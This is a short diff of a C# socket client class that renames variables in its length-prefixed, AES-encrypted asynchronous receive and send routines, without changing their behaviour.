@@ -93,12 +93,12 @@ namespace Client.Sockets
                     return;
                 }
 
-                int Recevied = Client.EndReceive(Iar);
-                if (Recevied > 0)
+                int recevied = Client.EndReceive(Iar);
+                if (recevied > 0)
                 {
                     if (BufferRecevied == false)
                     {
-                        MS.Write(Buffer, 0, Recevied);
+                        MS.Write(Buffer, 0, recevied);
                         Buffersize = BitConverter.ToInt32(MS.ToArray(), 0);
                         Debug.WriteLine("/// Client Buffersize " + Buffersize.ToString() + " Bytes  ///");
                         MS.Dispose();
@@ -111,7 +111,7 @@ namespace Client.Sockets
                     }
                     else
                     {
-                        MS.Write(Buffer, 0, Recevied);
+                        MS.Write(Buffer, 0, recevied);
                         if (MS.Length == Buffersize)
                         {
                             ThreadPool.QueueUserWorkItem(HandlePacket.Read, Settings.aes256.Decrypt(MS.ToArray()));
@@ -138,7 +138,7 @@ namespace Client.Sockets
             }
         }
 
-        public static void BeginSend(byte[] Msg)
+        public static void BeginSend(byte[] msg)
         {
             lock (SendSync)
             {
@@ -150,7 +150,7 @@ namespace Client.Sockets
                         return;
                     }
 
-                    byte[] buffer = Settings.aes256.Encrypt(Msg);
+                    byte[] buffer = Settings.aes256.Encrypt(msg);
                     byte[] buffersize = BitConverter.GetBytes(buffer.Length);
 
                     Client.Poll(-1, SelectMode.SelectWrite);
